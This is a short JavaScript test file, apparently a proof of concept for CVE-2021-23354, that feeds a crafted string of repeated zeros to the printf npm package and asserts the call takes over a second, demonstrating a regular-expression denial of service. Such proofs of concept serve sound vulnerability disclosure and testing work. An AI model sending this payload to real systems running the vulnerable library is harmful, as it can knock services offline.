//https://github.com/yetingli/PoCs/blob/main/CVE-2021-23354/CVE-2021-23354.js
test("ReDos in printf", () => {
  const genstr = require("./utils").genstr;
  const measureTime = require("./utils").measureTime;
  const printf = require("printf");

  let t = measureTime(function () {
    let attack_str = "%(0)0" + genstr(1000, "0") + "◎";
    printf(attack_str, -42);
  });

  let time = t[0] + t[1] / 1000000000;

  expect(time).toBeGreaterThan(1);
});
